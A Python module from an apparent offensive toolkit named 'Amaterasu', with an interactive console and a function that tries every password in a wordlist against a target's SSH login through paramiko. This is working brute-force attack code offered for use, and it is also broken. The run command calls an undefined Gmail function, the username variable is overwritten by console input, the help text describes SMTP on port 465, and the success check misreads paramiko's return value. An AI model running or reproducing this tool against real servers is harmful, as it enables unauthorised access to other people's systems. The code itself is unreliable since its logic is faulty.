#coding: utf-8
#!/usr/bin/python3

from huepy import *
import paramiko
import sys

def ssh_bruteforce_CONFIG():
	target = ''
	user = ''
	passwords = ''

	while True:
		user = input(bold(red('\nAMATERASU ')) + '(' + bold(lightcyan('ssh_bruteforce')) + ')' + '> ')
		if user.startswith('set'):
			try:
				if user.split(' ')[1] == 'target' or user.split(' ')[1] == 'TARGET':
					target = user.split(' ')[2]
					print(bold(info('Target set: ' + target)))
				elif user.split(' ')[1] == 'user' or user.split(' ')[1] == 'USER':
					user = user.split(' ')[2]
					print(bold(info('User set: ' + user)))
				elif user.split(' ')[1] == 'passwords' or user.split(' ')[1] == 'PASSWORDS':
					passwords = user.split(' ')[2]
					print(bold(info('Password wordlist set: ' + passwords)))
				else:
					print(bold(bad('Error: option do not exist.')))
					print(bold(info('Select what to set.\n')))
					print(bold(info('target\tset target TARGET')))
					print(bold(info('user\tset user USER (default: 465)')))
					print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
			except IndexError:
				print(bold(info('Select what to set.\n')))
				print(bold(info('target\tset target TARGET')))
				print(bold(info('user\tset user USER (default: 465)')))
				print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
		elif user.startswith('show'):
			try:
				if user.split(' ')[1] == 'config':
					print()
					sConfig = {'Target': target,
					'User': user,
					'Password wordlist': passwords}
					print(bold('CONFIG\t\t\tVALUE'))
					print(bold('------\t\t\t-----'))
					for a, b in sConfig.items():
						if len(a) > 15:
							print(bold(a + '\t' + b))
						elif len(a) <= 6:
							print(bold(a + '\t\t\t' + b))
						else:
							print(bold(a + '\t\t' + b))
				elif user.split(' ')[1] == 'options':
					print()
					sOptions = {'set target [TARGET]': 'Target',
					'set user [USER]': 'set user to use for smtp connection',
					'set passwords [PASSWORDS]': 'set password wordlist'}
					print(bold('COMMAND\t\t\tDESCRIPTION'))
					print(bold('-------\t\t\t-----------'))
					for a, b in sOptions.items():
						if len(a) > 15:
							print(bold(a + '\t' + b))
						elif len(a) <= 6:
							print(bold(a + '\t\t\t' + b))
						else:
							print(bold(a + '\t\t' + b))
				else:
					print(bold(bad('Error: option do not exist.')))
			except IndexError:
				print(bold(info('Select what to show.\n')))
				print(bold(info('Config\t\tshow config')))
				print(bold(info('Options\t\tshow options')))
		elif user.startswith('run'):
			try:
				gmail_bruteforce(target, user, passwords)
			except Exception as e:
				print(bold(bad('Error: {}'.format(e))))
		elif user == '?' or user == 'help':
			sHelp = {'help | ?':'print this help message.',
			'show (config|options)':'show configuration or options',
			'set target': 'set target to scan',
			'set passwords': 'set password file to use',
			'set user': 'set user to attack',
			'run':'execute module',
			'back':'back to menu',
			'exit':'quit from Amaterasu'}
			print()
			print(bold('COMMAND\t\t\tDESCRIPTION'))
			print(bold('-------\t\t\t-----------'))
			for a, b in sHelp.items():
				if len(a) > 15:
					print(bold(a + '\t' + b))
				elif len(a) <= 6:
					print(bold(a + '\t\t\t' + b))
				else:
					print(bold(a + '\t\t' + b))
		elif user == 'back':
			break
		elif user == 'exit':
			print(bold(good('Thanks for using Amaterasu.')))
			sys.exit()

def ssh_bruteforce(target, user, passwords):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	passlist = open(passwords)

	for passw in passlist.readlines():
		passw = passw.strip()
		try:
			r = ssh.connect(target, port=22, username=user, password=passw)
			if r == 0:
				print(bold(good('Success.')))
				print(bold(good('Username: ' + user)))
				print(bold(good('Password: ' + passw)))
				ssh.close()
			else:
				print()
				print(bold(bad('Failed.')))
				print(bold(bad('Username failed: ' + user)))
				print(bold(bad('Password failed: ' + passw)))
				ssh.close()
		except paramiko.AuthenticationException:
			print()
			print(bold(bad('Failed.')))
			print(bold(bad('Username failed: ' + user)))
			print(bold(bad('Password failed: ' + passw)))
			ssh.close()
		except Exception as e:
			print()
			print(bold(bad('Failed: {}'.format(e))))
			ssh.close()
